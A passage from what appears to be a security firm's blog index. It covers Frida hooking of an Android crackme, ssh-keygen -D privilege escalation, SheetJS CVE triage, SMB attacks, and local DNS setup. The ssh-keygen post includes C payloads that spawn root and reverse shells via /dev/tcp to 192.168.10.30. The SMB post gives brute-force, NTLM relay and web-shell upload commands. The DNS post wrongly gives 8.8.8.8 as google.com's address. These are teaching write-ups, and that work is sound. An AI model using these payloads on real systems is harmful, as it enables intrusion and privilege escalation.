all running processes to locate the app:</p> <pre><code>frida-ps -Ua\n</code></pre>"},{"location":"blog/posts/15-12-2024/#step-2-attach-to-the-process-and-enumerate-methods","title":"Step 2: Attach to the Process and Enumerate Methods","text":"<p>Create a script to list methods in the app:</p> <pre><code>// listmethods.js\nJava.perform(() =&gt; {\n  const groups = Java.enumerateMethods(\"*MainActivity*!onCl*\");\n  console.log(JSON.stringify(groups, null, 2));\n});\n</code></pre> <p>Attach to the process and execute the script:</p> <pre><code>frida -U &lt;PID&gt; -l listmethods.js\n</code></pre>"},{"location":"blog/posts/15-12-2024/#step-3-override-the-method-implementation","title":"Step 3: Override the Method Implementation","text":"<p>Use Frida to modify the <code>onClick()</code> method:</p> <pre><code>// override.js\nJava.perform(() =&gt; {\n  const main = Java.use('sg.vantagepoint.uncrackable1.MainActivity$1');\n  main.onClick.implementation = function () {\n    console.log('Pwned!');\n  };\n});\n</code></pre> <p>Run the script and verify that pressing \"OK\" no longer closes the app.</p>"},{"location":"blog/posts/15-12-2024/#extracting-the-secret-passphrase","title":"Extracting the Secret Passphrase","text":"<p>Inspect the code further to find the function responsible for decrypting the secret passphrase. Log the decryption output using Frida:</p> <pre><code>// logDecryptor.js\nJava.perform(() =&gt; {\n  const AESDecryptor = Java.use(\"sg.vantagepoint.a.a\");\n  AESDecryptor[\"a\"].implementation = function (bArr, bArr2) {\n    console.log(`AESDecryptor.decrypt is called: bArr=${bArr}, bArr2=${bArr2}`);\n    const result = this[\"a\"](bArr, bArr2);\n    console.log(`AESDecryptor.decrypt result=${result}`);\n    return result;\n  };\n});\n</code></pre> <p>Convert the output byte array to a string using Python to reveal the secret phrase.</p> <p>With this setup, Android Studio enables app emulation and debugging, Burp Suite facilitates traffic interception and analysis, Frida allows dynamic application instrumentation, and Objection automates common security testing tasks. The added dynamic analysis section demonstrates the practical application of these tools in extracting secrets and bypassing protections, making this guide a comprehensive resource for mobile app security testing.</p>"},{"location":"blog/posts/17-10-2024/","title":"Abusing ssh-keygen","text":"<p>SSH-Keygen is a tool that allows you to create and manage SSH keys, this tool is present in most UNIX systems today as a tool to facilitate the management of SSH keys.</p> <p>In this article we will explore some methods to abuse this tool with certain configurations as a method of persistence or privilege escalation on the system.</p> <p>In particular, we will abuse a specific functionality of this binary that allows the loading of public keys from a card reader library, this option is the -D parameter, its use is as follows: </p> <pre><code>ssh-keygen -D ./lib.so\n</code></pre>"},{"location":"blog/posts/17-10-2024/#how-to-generate-the-payload","title":"How to generate the payload","text":"<p>Now that we've explained how to use this function, let's look in more detail at how to generate a loadable payload, for which we'll first need to obtain a version of pkcs11.h . This header file is where we define the data types needed for the function of our library that will call ssh-keygen when using the -D parameter. </p> <p>In our case, we will go to the Open Smart Card repository and download the version we need from the following URL</p> <p>Github Code </p> <p>With this file we will proceed to write a small program in C with the necessary structure to be executed by ssh-keygen, in our case this program will spawn a bash shell.</p> <pre><code>#include \"pkcs11.h\"\n#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n\nCK_RV C_GetFunctionList(CK_FUNCTION_LIST_PTR_PTR ppFunctionList) {\n\n    pid_t pid = fork();\n\n    if (pid == 0) {\n\n        char *cmd = \"/bin/bash\";\n        char *args[] = {cmd, NULL};\n        execv(cmd,args);\n\n   } else if(pid &gt; 0) {\n        wait(NULL);\n    } else {\n        perror(\"fork\");\n        return 1;\n    }\n\n    return CKR_OK;\n}\n</code></pre> <p>Once compiled we can load it as a library as indicated in the introduction. </p>"},{"location":"blog/posts/17-10-2024/#profit","title":"Profit","text":""},{"location":"blog/posts/17-10-2024/#case-1-sudo-ssh-keygen","title":"Case 1: Sudo SSH-Keygen","text":"<p>Let's take advantage of a scenario where our user has permissions to execute the ssh-keygen command as root.</p> <pre><code>Matching Defaults entries for pnavas on test:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/snap/bin,\n    use_pty\n\nUser pnavas may run the following commands on permx:\n    (ALL : ALL) NOPASSWD: /usr/bin/ssh-keygen\n</code></pre> <p>In this case, instead of using a simple bash call, we will load a reverse shell.</p> <pre><code>#include \u2018pkcs11.h\u2019\n#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n\nCK_RV C_GetFunctionList(CK_FUNCTION_LIST_PTR_PTR ppFunctionList) {\n\n    pid_t pid = fork();\n\n    if (pid == 0) {\n\n        char *cmd = \u2018/bin/bash\u2019;\n        char *args[] = {cmd, \u2018-c\u2019 , \u2018bash -i &gt;&amp; /dev/tcp/192.168.10.30/9001 0&gt;&amp;1\u2019, NULL};\n        execv(cmd,args);\n\n   } else if(pid &gt; 0) {\n        wait(NULL);\n    } else {\n        perror(\u2018fork\u2019);\n        return 1;\n    }\n\n    return CKR_OK;\n}\n</code></pre> <p>As a result, when we load it, we will get a root connection in our listener, we could modify it to run a shell simply as in the example in the theory section </p>"},{"location":"blog/posts/17-10-2024/#case-2-ssh-keygen-suid","title":"Case 2: SSH Keygen SUID","text":"<p>In this scenario we are going to exploit a slightly less common scenario where ssh-keygen has the SUID bit set, in this case to keep the SUID privileges we need to change the library code a bit so that the shell keeps the privileges</p> <pre><code>#include \u2018pkcs11.h\u2019\n#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n\nCK_RV C_GetFunctionList(CK_FUNCTION_LIST_PTR_PTR ppFunctionList) {\n\n    pid_t pid = fork();\n\n    if (pid == 0) {\n\n        char *cmd = \u2018/bin/bash\u2019;\n        char *args[] = {cmd, \u2018-p\u2019, NULL};\n        execv(cmd,args);\n\n   } else if(pid &gt; 0) {\n        wait(NULL);\n    } else {\n        perror(\u2018fork\u2019);\n        return 1;\n    }\n\n    return CKR_OK;\n}\n</code></pre> <p>Once compiled, we can run the command to load the library and get a shell with the necessary privileges.</p>"},{"location":"blog/posts/17-10-2024/#final-thoughts","title":"Final Thoughts","text":"<p>As demonstrated, ssh-keygen is a powerful tool that, when misconfigured or misused, can become a significant security risk. The scenarios presented in this article highlight the importance of properly configuring and restricting access to binaries with elevated privileges.</p> <p>By understanding and proactively managing the capabilities and risks associated with common tools like ssh-keygen, administrators can ensure the integrity and security of their systems. </p> <p>Note</p> <p>Always adopt the principle of least privilege and conduct regular security audits to minimize attack surfaces.</p>"},{"location":"blog/posts/19-01-2025/","title":"The day that Dependabot met SheetJS","text":"<p>It all started with a notification from Dependabot a few days ago. While reviewing an internal project repository, I encountered the following message:</p> Dependabot alert <p>I proceeded with the standard Dependabot workflow to address the issues, as I had assumed it was a routine update. However, I was surprised when the fixes for both vulnerabilities failed because the required patched version could not be found.</p> Dependabot alert for DoS in SheetJS Dependabot alert for Prototype Pollution on SheetJS <p>After some investigation, I discovered an ongoing conflict between npm and the developers of xlsx, due to an issue with the Multi-Factor Authentication (MFA) token from a few years ago. As a result, xlsx has dropped out of the npm ecosystem and is now publishing its packages through other Content Delivery Networks (CDNs) for the distribution of its packages. This has introduced a new level of complexity, making it more challenging for users of npm to update packages and address vulnerabilities effectively.</p> <p>Since our application was affected by these vulnerabilities, I decided to dig deeper into them to assess the risk of delaying the patch and to explore possible workarounds if necessary, and it was also a good excuse to write an article for the blog, an article that can surely help more than one developer to decide how to deal with the same situation in SheetJS or xlsx. With that in mind, let us analyse the two vulnerabilities reported by the dependanbot in more detail:</p>"},{"location":"blog/posts/19-01-2025/#prototype-pollution-in-sheetjs-aka-cve-2023-30533","title":"Prototype Pollution in SheetJS aka CVE-2023-30533","text":"<p>This vulnerability in SheetJS allows an attacker to upload a specially crafted file that would corrupt existing object prototypes in the application. Prototype pollution could potentially lead to serious problems such as Remote Code Execution (RCE), Cross-Site Scripting (XSS) or Denial of Service (DoS). Depending on the context, this is a significant threat.</p> <p>Digging around, I found an article written by a researcher at Solid Labs who discovered the vulnerability. Although the article is in Russian and partially behind a paywall, it gives some insight into the context and impact of the vulnerability. On the one hand the risk seems to be limited, on the other hand it confirms that XSS can be achieved with this vulnerability, although the proof of concept for the XSS is behind the paywall.</p> <p>Using the freely available part of the article, I was able to create a basic PoC for prototype pollution with limited impact. This allowed us to test if our application was vulnerable and implement a targeted patch to sanitise the attack vector while preparing for a full version update. Also using the PoC and reviewing the commit that patched the vulnerability, I found that the vulnerability occurred when importing a sheet with comments. The root cause seems to be that the developers didn't anticipate that cell references could be manipulated by an attacker. Their final solution was to validate that the cell references were legitimate.</p> <p>Knowing this, we can create a local patch for our library version, but having worked as a pentester for several years, I was curious about how to scale this prototype pollution to XSS. Reviewing the patch was the key to finding the XSS vector:</p> Commit that fix the XSS <p>We can see that the developers added escapehtml to a line in the same commit that fixes the vulnerability. Tracing the code backwards, we can see that the corrected line was only executed when the library was used to parse the XLS to HTML using the make_html_row function. In our case, as we don't use HTML parsing in our application, this vulnerability is not critical as we don't use the vulnerable function. However, we have applied the two patches locally to improve security while we prepare for the full update.</p> <p>Knowing this, developing an exploit to generate a malicious XLSX with an XSS payload is fairly straightforward. However, in order not to make it easier to exploit by publishing a proof of concept for a difficult to mitigate vulnerability, I will not publish a working proof of concept for exploiting this XSS in a package that gets about 2.5 million downloads per week.</p>"},{"location":"blog/posts/19-01-2025/#sheetjs-regular-expression-denial-of-service-redos-cve-2024-22363","title":"SheetJS Regular Expression Denial of Service (ReDoS) (CVE-2024-22363)","text":"<p>This vulnerability allows an attacker to upload a file that causes a significant delay in the application by exploiting regex flaws in SheetJS. Although not critical to our application, I was interested in replicating the problem and creating a temporary virtual patch until the update was ready.</p> <p>The first step was to examine the commit in the SheetJS repository. The code revealed several greedy regex patterns, in particular the reported one is in the parsing of comments &lt;!--). The researcher provided a PoC demonstrating how to exploit this vulnerability.</p> <p>We can verify the vulnerability in the following way:</p> <p> Proof of Concept for ReDoS <p>While the PoC shows a delay of 42 seconds, the workload grows exponentially with larger files. A file ten times its original size would take 4,980 seconds to process - 100 times the delay for only a tenfold increase in content.</p> <p>In our case, testing the PoC on our development environment showed no noticeable delay, as our application validates that the file is a real XLS file before parsing. This validation mitigates the exploitability of the vulnerability in our setup. However, it's still necessary to address the issue as there are more greedy regex in the library.</p> <p>Two potential solutions were identified:</p> <ul> <li>Detect exploitation signs before parsing the XLS.</li> <li>Update the SheetJS version.</li> </ul> <p>The first option has drawbacks. Checking for exploit patterns via regex may inadvertently introduce a new ReDoS vulnerability, and addressing all problematic regex patterns in the application adds unnecessary complexity.</p> <p>The second option, while straightforward, is complicated by the fact that the package is no longer part of the npm ecosystem and must be imported manually.</p> <p>Given these considerations, our team at Atlansec chose the second option and updated SheetJS for this application.</p>"},{"location":"blog/posts/19-01-2025/#conclusion","title":"Conclusion","text":"<p>Dependabot's alert on the SheetJS vulnerabilities served as a reminder of the complexity of dependency management. Addressing these issues required more than a simple one-click update. To make a good decision, we took a deep dive into the nature of the vulnerabilities, analysing their impact on our application and the practicality of the solutions available.</p> <p>By closely examining the vulnerabilities, Atlansec have developed on-premises mitigation strategies that meet the needs of our application. As with most projects, it's not just about fixing alerts, it's about understanding their implications and making decisions that balance both security and operational needs. For us, it was a reminder of how vigilance and adaptability can turn dependency challenges into opportunities to strengthen our application's security posture. And how important it is to build a security posture into both the development and maintenance of the application, not just from the perspective of an occasional vulnerability test.</p>"},{"location":"blog/posts/22-12-2024/","title":"New EU Cyber Resilience Act","text":"<p>On October 23, 2024, the European Cyber Resilience Regulation came into force, marking a regulatory shift aimed at strengthening digital security across the European Union. At Atlansec, this milestone reinforces our core mission: to create solutions and digital products that are secure throughout their lifecycle and ensure the protection of the environments in which they operate.</p>"},{"location":"blog/posts/22-12-2024/#what-does-this-regulation-entail","title":"What does this regulation entail?","text":"<p>The new regulatory framework establishes clear and unified requirements to ensure cybersecurity in the design, development, manufacturing, and commercialization of digital products. Its goal is to close existing security gaps and provide consumers and businesses with the confidence that the products they purchase are designed to be secure against current and future threats.</p>"},{"location":"blog/posts/22-12-2024/#key-objectives-of-the-regulation","title":"Key Objectives of the Regulation","text":"<ul> <li>Cybersecurity standards across Europe:   These apply to all connected products, whether directly or indirectly linked to networks or devices, avoiding overlaps between legislations in different Member States.</li> <li>Security throughout the lifecycle:   Manufacturers must implement vulnerability management processes, conduct risk assessments, and issue declarations of conformity.</li> <li>Greater transparency for consumers:   Facilitating the identification of secure products, helping users make informed decisions when purchasing hardware or software.</li> <li>Shared responsibility across the value chain:   Manufacturers, importers, and distributors must ensure compliance with these measures, enhancing security at every stage\u2014from design to end use.</li> </ul>"},{"location":"blog/posts/22-12-2024/#key-aspects-of-the-new-regulation","title":"Key Aspects of the New Regulation","text":"<ul> <li>Comprehensive coverage:   All digital products are subject to the regulation, except those already governed by other standards (e.g., medical devices, aircraft, and automobiles).</li> <li>Vulnerability management:   Manufacturers must ensure their digital products remain secure against new threats through timely updates.</li> <li>Market surveillance framework:   Strengthened oversight to ensure compliance with these standards and safeguard end users.</li> </ul> <p>At Atlansec, we firmly believe that cybersecurity must be the foundation of everything we do. Our commitment is to ensure that every solution, every line of code, and every product we develop is designed with security in mind\u2014not only in digital environments but also in the systems and structures that support them. This is how we build trust in an increasingly complex digital world.</p>"},{"location":"blog/posts/24-11-2024/","title":"SMB 101","text":"<p>SMB (Server Message Block) is a protocol used to share resources such as files, printers, and directories over a network. It uses a client-server architecture, where the server makes resources available, and multiple clients can access them. Although SMB3 introduces encryption to protect data, earlier versions like SMB1 transmit information in plain text, making it vulnerable to certain attacks.</p> <p>In this article, we will focus on basic concepts, key commands, and common attacks related to SMB, highlighting the use of tools like enum4linux for enumeration.</p>"},{"location":"blog/posts/24-11-2024/#theory","title":"Theory","text":""},{"location":"blog/posts/24-11-2024/#ports-used-by-smb","title":"Ports Used by SMB","text":"<p>SMB primarily operates on the following ports:</p> <ul> <li>445/TCP: Used by modern SMB for direct connections without NetBIOS.</li> <li>139/TCP: Used by older versions relying on NetBIOS.</li> </ul>"},{"location":"blog/posts/24-11-2024/#authentication-in-smb","title":"Authentication in SMB","text":"<p>SMB employs several authentication mechanisms:</p> <ul> <li>NTLM (LAN Manager): Vulnerable to relay and brute-force attacks.</li> <li>Kerberos: More secure, used in environments with Active Directory.</li> </ul>"},{"location":"blog/posts/24-11-2024/#enumeration-with-smb","title":"Enumeration with SMB","text":"<p>Enumeration is the initial step to gather information about shared resources, users, and the SMB server configuration. Here are some common tools for this purpose:</p>"},{"location":"blog/posts/24-11-2024/#enum4linux","title":"Enum4linux","text":"<p>Enum4linux is an enumeration tool specifically designed for SMB. It allows identifying shared resources, password policies, and users on Windows systems.</p> <p>Common Commands:</p> <pre><code>enum4linux &lt;IP&gt;\n</code></pre> <p>Specific Modes:</p> <ul> <li> <p>Enumerate users:   <pre><code>enum4linux -U &lt;IP&gt;\n</code></pre></p> </li> <li> <p>Enumerate shared resources:   <pre><code>enum4linux -S &lt;IP&gt;\n</code></pre></p> </li> <li> <p>Enumerate domain information:   <pre><code>enum4linux -n &lt;IP&gt;\n</code></pre></p> </li> </ul> <p>Typical Outputs:</p> <ul> <li>Available shared resources.</li> <li>System users.</li> <li>Password policies, such as expiration and minimum length.</li> </ul>"},{"location":"blog/posts/24-11-2024/#smbclient","title":"SMBClient","text":"<p>SMBClient is a tool integrated into Linux systems for interacting directly with SMB resources.</p> <p>Example Usage:</p> <pre><code>smbclient //&lt;IP&gt;/&lt;share_name&gt; -U &lt;username&gt;\n</code></pre> <p>After connecting, you can list, download, and upload files with FTP-like commands:</p> <pre><code>ls      # List current directory (file management and navigation commands similar to Linux)\nget     # Download a file\nput     # Upload a file\n</code></pre> <p>Enumerating shared resources:</p> <pre><code>smbclient -L //&lt;IP&gt; -U &lt;username&gt;\n</code></pre>"},{"location":"blog/posts/24-11-2024/#common-smb-attacks","title":"Common SMB Attacks","text":""},{"location":"blog/posts/24-11-2024/#null-sessions","title":"Null Sessions","text":"<p>Null sessions occur when an SMB server allows connections without authentication, exposing information such as shared resources and users.</p> <p>Enumerating Null Sessions with smbclient:</p> <pre><code>smbclient -L //&lt;IP&gt; -N\n</code></pre> <p>Danger</p> <p>Attackers can use this information to plan more advanced attacks, such as brute-force password attacks.</p>"},{"location":"blog/posts/24-11-2024/#brute-force-and-password-spraying","title":"Brute Force and Password Spraying","text":"<p>SMB can be vulnerable to brute-force attacks if proper security measures are not implemented. Tools like Hydra and Medusa are common for this purpose.</p> <p>Hydra for SMB:</p> <pre><code>hydra -L users.txt -P passwords.txt smb://&lt;IP&gt;\n</code></pre> <p>NetExec:</p> <pre><code>nxc smb &lt;IP&gt; -u users.txt -p passwords.txt\n</code></pre> <p>Danger</p> <p>The attacker may gain unauthorized access to shared resources if valid credentials are cracked.</p>"},{"location":"blog/posts/24-11-2024/#ntlm-relay","title":"NTLM Relay","text":"<p>This attack intercepts and forwards NTLM authentications to impersonate the legitimate user. SMB servers with signing disabled are especially vulnerable.</p> <p>Using Responder:</p> <pre><code>responder -I &lt;network_interface&gt;\n</code></pre> <p>Tip</p> <p>In order to mitigate, enable SMB signing and use Kerberos authentication instead of NTLM.</p>"},{"location":"blog/posts/24-11-2024/#credential-sniffing","title":"Credential Sniffing","text":"<p>Older versions like SMB1 transmit credentials in plain text, allowing an attacker to capture credentials with tools like Wireshark.</p> <p>Wireshark Filter:</p> <pre><code>tcp.port == 445\n</code></pre> <p>Danger</p> <p>An attacker may use captured credentials to access the SMB server.</p>"},{"location":"blog/posts/24-11-2024/#file-upload-for-rce","title":"File Upload for RCE","text":"<p>If an SMB resource allows writing, an attacker may upload malicious files, such as web shells, to execute remote commands.</p> <p>Uploading with SMBClient:</p> <pre><code>smbclient //&lt;IP&gt;/&lt;share_name&gt; -U &lt;username&gt;\nput webshell.aspx\n</code></pre> <p>Danger</p> <p>This can compromise the server, allowing command execution or malware installation.</p>"},{"location":"blog/posts/24-11-2024/#defenses-against-smb-exploits","title":"Defenses Against SMB Exploits","text":"<ol> <li> <p>Disable SMB1: It is outdated and vulnerable. Replace it with SMB2 or SMB3:</p> <pre><code>Set-SmbServerConfiguration -EnableSMB1Protocol $false\n</code></pre> </li> <li> <p>Enable SMB Signing: To prevent NTLM relay attacks.</p> </li> <li>Restrict Permissions: Ensure shared resources are protected with strict permissions.</li> <li>SMB3 Encryption: SMB3 allows encrypting traffic, protecting against sniffing.</li> <li>Regular Monitoring: Use tools like Splunk or Wireshark to detect anomalous activity.</li> </ol> <p>In the next article of this series on SMB we will discuss common implementation errors and some known vulnerabilities of some implementations of the protocol.</p>"},{"location":"blog/posts/26-01-2025%281%29/","title":"Setting up a local DNS","text":"<p>In this article, we are going to explore what a DNS is and how this hierarchy works so that you can better understand its crucial role in Internet navigation. From the root servers that act as the starting point, through TLD and authoritative servers, we come to the local DNS, the key piece that connects this entire global system to your home or business network and optimize your environment's navigation!</p> <p>Moreover, if you want to take your knowledge to the next level and discover how this hierarchy system ensures that every page that you visit is just a click away, read on.</p>"},{"location":"blog/posts/26-01-2025%281%29/#if-youve-ever-wondered-how-the-internet-works-behind-scenes-youve-probably-heard-about-dns-domain-name-system-this-system-is-like-the-phone-book-of-the-web-it-converts-easy-to-remember-domain-names-such-as-wwwexamplecom-into-ip-addresses-that-computers-use-to-connect-each-other-although-this-process-seems-magical-is-the-result-of-a-carefully-organized-hierarchical-system-that-goes-from-root-servers-to-the-level-closest-to-you-the-local-dns","title":"If you've ever wondered how the internet works behind scenes, you've probably heard about DNS (Domain Name System). This system is like the phone book of the web: it converts easy-to-remember domain names, such as www.example.com, into IP addresses that computers use to connect each other. Although, this process seems magical, is the result of a carefully organized hierarchical system that goes from root servers to the level closest to you: the Local DNS.","text":""},{"location":"blog/posts/26-01-2025/","title":"Comprehensive Guide to DNS: Overview, Setup & Security","text":"<p>Understanding the DNS (Domain Name System) is essential for anyone interested in how the internet works. DNS plays a crucial role in translating human-friendly domain names into machine-readable IP addresses, ensuring seamless web navigation.</p> <p>This guide walks you through:</p> <ul> <li>The hierarchical structure of DNS and its key components.</li> <li>Types of DNS queries and how they function.</li> <li>DNS security concerns and protective measures such as DNSSEC.</li> <li>Setting up a local DNS server using BIND9 for improved performance, privacy, and content filtering.</li> </ul> <p>So, if you want to take your knowledge to the next level and discover how this hierarchical system ensures that every page you visit is just a click away, read on.</p>"},{"location":"blog/posts/26-01-2025/#the-basics-what-does-a-dns-do","title":"The Basics: What Does a DNS Do?","text":"<p>When you enter a domain name into your browser, your computer doesn\u2019t understand that name directly. Instead, your device initiates a process called name resolution to find the corresponding IP address. DNS servers handle this resolution through a structured, hierarchical system.</p>"},{"location":"blog/posts/26-01-2025/#the-hierarchy-of-dns-servers","title":"The Hierarchy of DNS Servers","text":"Hierarchy of DNS Servers for Google <p>The DNS operates as a distributed, hierarchical system. Each level in this hierarchy plays a specific role in translating domain names into IP addresses. Here\u2019s how it works:</p>"},{"location":"blog/posts/26-01-2025/#recursive-resolver-your-dns-query-starts-here","title":"Recursive Resolver (Your DNS Query Starts Here)","text":"<ul> <li>When you type a URL in your browser, your device sends a request to a recursive resolver. This is usually provided by your Internet Service Provider (ISP) or a third-party service such as Google Public DNS or Cloudflare.</li> <li>The recursive resolver's job is to handle your query and fetch the correct IP address by contacting other DNS servers on your behalf.</li> </ul>"},{"location":"blog/posts/26-01-2025/#root-dns-servers-the-starting-point","title":"Root DNS Servers (The Starting Point)","text":"<ul> <li>If the recursive resolver doesn\u2019t already have the IP address cached, it contacts one of the 13 root DNS servers distributed globally.</li> <li>These servers don\u2019t store specific domain-to-IP mappings but point to the next level in the hierarchy: Top-Level Domain (TLD) servers.</li> </ul>"},{"location":"blog/posts/26-01-2025/#top-level-domain-tld-servers","title":"Top-Level Domain (TLD) Servers","text":"<ul> <li>TLD servers manage domains based on their suffix, such as <code>.com</code>, <code>.org</code>, or <code>.net</code>. For instance, if you\u2019re visiting <code>google.com</code>, the root server will direct your query to the <code>.com</code> TLD server.</li> <li>The TLD server then provides the address of the authoritative name server for the requested domain.</li> </ul>"},{"location":"blog/posts/26-01-2025/#authoritative-name-server","title":"Authoritative Name Server","text":"<ul> <li>The authoritative name server is the final step in the chain. It holds the actual DNS records for the domain, including the IP address of the web server.</li> <li>For Google, if you\u2019re looking for <code>google.com</code>, the authoritative server will return its corresponding IP address (e.g., <code>8.8.8.8</code>).</li> </ul>"},{"location":"blog/posts/26-01-2025/#returning-the-answer","title":"Returning the Answer","text":"<ul> <li>Once the recursive resolver gets the IP address from the authoritative server, it sends it back to your browser. Your browser can then use the IP address to connect to the website\u2019s server and load the page.</li> </ul>"},{"location":"blog/posts/26-01-2025/#types-of-dns-queries","title":"Types of DNS Queries","text":"<p>During this process, there are three main types of DNS queries:</p> <ol> <li>Recursive Query: The resolver takes full responsibility for finding the IP address and returns it to the client.</li> <li>Iterative Query: The resolver queries each DNS server in sequence, receiving referrals to the next server until it finds the IP address.</li> <li>Non-Recursive Query: If the resolver already has the requested information cached, it immediately returns the result.</li> </ol>"},{"location":"blog/posts/26-01-2025/#dns-records-the-building-blocks","title":"DNS Records: The Building Blocks","text":"<p>The authoritative name server stores different types of DNS records that contain specific information about a domain. Some of the most common records include:</p> <ul> <li>A Record: Maps a domain to an IPv4 address.</li> <li>AAAA Record: Maps a domain to an IPv6 address.</li> <li>CNAME Record: Points a domain to another domain (used for aliases).</li> <li>MX Record: Specifies mail servers for email delivery.</li> <li>TXT Record: Provides additional information about a domain, often used for verification.</li> </ul>"},{"location":"blog/posts/26-01-2025/#dns-caching-speeding-things-up","title":"DNS Caching: Speeding Things Up","text":"<p>To improve performance and reduce the load on DNS servers, caching is used at various levels:</p> <ul> <li>Browser Cache: Your browser temporarily stores DNS responses for domains you visit frequently.</li> <li>Operating System Cache: Your device\u2019s operating system also caches DNS responses to avoid redundant queries.</li> <li>Resolver Cache: The recursive resolver keeps a cache of recently queried domains to speed up future lookups.</li> </ul> <p>Caching ensures that most DNS queries don\u2019t need to traverse the entire hierarchy, making internet browsing faster and more efficient.</p> <p>To observe how DNS caching reduces response times, let's use the dig command paying attention to the Query Time for google domain:</p> <p>In the first trial we got:</p> <pre><code>; &lt;&lt;&gt;&gt; DiG 9.18.28-1~deb12u2-Debian &lt;&lt;&gt;&gt; google.com\n;; global options: +cmd\n;; Got answer:\n;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 25335\n;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 1232\n;; QUESTION SECTION:\n;google.com.                    IN      A\n\n;; ANSWER SECTION:\ngoogle.com.             215     IN      A       142.250.200.142\n\n;; Query time: 68 msec\n</code></pre> <p>And in the second time, we got:</p> <pre><code>; &lt;&lt;&gt;&gt; DiG 9.18.28-1~deb12u2-Debian &lt;&lt;&gt;&gt; google.com\n;; global options: +cmd\n;; Got answer:\n;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 44597\n;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 1232\n;; QUESTION SECTION:\n;google.com.                    IN      A\n\n;; ANSWER SECTION:\ngoogle.com.             287     IN      A       142.250.200.78\n\n;; Query time: 36 msec\n</code></pre> <p>As we can see, the time has decreased.</p>"},{"location":"blog/posts/26-01-2025/#dns-security","title":"DNS Security","text":"<p>Despite its importance, the DNS system has vulnerabilities that can be exploited by attackers. Some common issues include:</p> <ul> <li>DNS Spoofing/Poisoning: Malicious actors inject false DNS records into a cache, redirecting users to fraudulent websites.</li> <li>DDoS Attacks: This is one of the most well-known attacks consisting on flooding DNS servers with traffic to disrupt service.</li> <li>Man-in-the-Middle Attacks: Intercepting DNS queries to modify responses.</li> </ul> <p>To combat these threats, technologies like DNSSEC (Domain Name System Security Extensions) add cryptographic signatures to DNS records, ensuring their authenticity. Imagine you want to visit google.com:</p> <ol> <li>Your browser requests the IP address for google.com from a recursive resolver.</li> <li>The resolver checks the DNSSEC signatures at each level (root, .com, and google.com).</li> <li>If all signatures are valid, the resolver returns the IP address.</li> <li>If any signature fails, the resolver knows the data has been tampered with and discards it.</li> </ol>"},{"location":"blog/posts/26-01-2025/#setup-a-local-dns-for-privacy-and-performance-purposes","title":"Setup a Local DNS for Privacy and Performance purposes","text":"<p>If you've made it this far, congratulations! You now understand the basics and key principles of DNS servers. With this knowledge, you're ready to roll up your sleeves and set up your own local DNS server. Doing so opens up a world of possibilities: you can filter unwanted content across your network, enhance browsing performance, and even navigate the internet more securely, minimizing the risk of viruses and other online threats.</p>"},{"location":"blog/posts/26-01-2025/#bind9","title":"Bind9","text":"<p>In this article, we'll use the BIND9 DNS server to set up a DNS server directly on our computer. This hands-on approach will let us experience what it\u2019s like to have a fully functional DNS server running within our own network\u2014right from the comfort of our own machine!</p> <p>Let's first install bind9:</p> <pre><code>sudo apt update\nsudo apt install bind9 dnsutils\n</code></pre> <p>Configure your system to first ask the local DNS server that we have installed:</p> <pre><code>sudo nano /etc/resolv.conf\n</code></pre> <p>Add the local server as the first line.</p> <pre><code>nameserver 127.0.0.1\n</code></pre> <p>After that, we will edit the configuration file:</p> <pre><code>sudo nano /etc/bind/named.conf.options\n</code></pre> <p>Remove everything in that file and add the following:</p> <pre><code>acl \"trusted\" {\n    192.168.0.0/16;\n    localhost;\n};\n\noptions {\n    directory \"/var/cache/bind\";\n\n    recursion yes;\n    allow-query { trusted; };\n\n    forwarders {\n        1.1.1.3;\n        1.1.1.2;\n    };\n\n    dnssec-validation auto;\n\n    listen-on { any; };\n    listen-on-v6 { any; };\n};\n</code></pre> <p>This ACL specifies which clients are considered \"trusted\" and can interact with the DNS server.</p> <p>The options block contains global settings for the BIND9 server. Let\u2019s go through each line:</p> <ul> <li> <p><code>directory \"/var/cache/bind\";</code> This specifies the directory where BIND will store its cache and related files.</p> </li> <li> <p><code>recursion yes;</code> Enables recursive queries, meaning the server will resolve DNS queries on behalf of clients by querying other DNS servers if it doesn\u2019t have the answer cached or locally configured.</p> </li> <li> <p><code>allow-query { trusted; };</code> Restricts which clients can send queries to the server. Only clients defined in the trusted ACL (local network and localhost) are allowed to query this DNS server.</p> </li> <li> <p><code>forwarders { 1.1.1.3; 1.1.1.2; };</code> Defines external DNS servers (in this case, Cloudflare's filtered DNS servers) to which the server will forward queries it cannot resolve locally. The server acts as an intermediary, forwarding unresolved queries to these upstream servers.</p> <ul> <li>1.1.1.3: Blocks malicious content.</li> <li>1.1.1.2: Blocks malware-related content.</li> </ul> </li> <li> <p><code>dnssec-validation auto;</code> Enables DNSSEC validation automatically, ensuring the authenticity and integrity of DNS responses using cryptographic signatures.</p> </li> </ul> <p>With this configuration, we\u2019ve implemented basic security measures by trusting Cloudflare's DNS servers to handle forwarded queries, ensuring that responses are filtered to avoid malicious domains.</p> <p>We can check our performance improvement by doing the same as before, using the dig command to look for the Query Time of google.com domain.</p> <pre><code>; &lt;&lt;&gt;&gt; DiG 9.18.28-1~deb12u2-Debian &lt;&lt;&gt;&gt; google.com\n;; global options: +cmd\n;; Got answer:\n;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 56385\n;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 1232\n; COOKIE: 2b2a789af74949000100000067966b06329ed55c149fd975 (good)\n;; QUESTION SECTION:\n;google.com.                    IN      A\n\n;; ANSWER SECTION:\ngoogle.com.             300     IN      A       142.250.200.142\n\n;; Query time: 67 msec\n;; SERVER: 127.0.0.1#53(127.0.0.1) (UDP)\n;; MSG SIZE  rcvd: 83\n</code></pre> <p>After the second query, we achieve a 0ms response time, as our local DNS 